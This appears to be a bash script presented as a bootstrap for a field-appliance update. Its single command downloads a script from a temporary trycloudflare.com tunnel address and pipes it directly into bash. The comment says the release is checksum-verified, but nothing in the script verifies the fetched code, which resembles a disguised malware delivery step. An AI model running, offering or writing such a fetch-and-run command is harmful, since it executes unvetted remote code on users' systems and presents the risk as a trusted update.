#!/usr/bin/env bash
set -euo pipefail

# Short-lived bootstrap for the August 24 field-appliance update. The release
# itself is checksum-verified by the installer before any files are changed.
curl --fail --silent --show-error --location \
  https://hundred-downloading-records-increase.trycloudflare.com/install \
  | bash
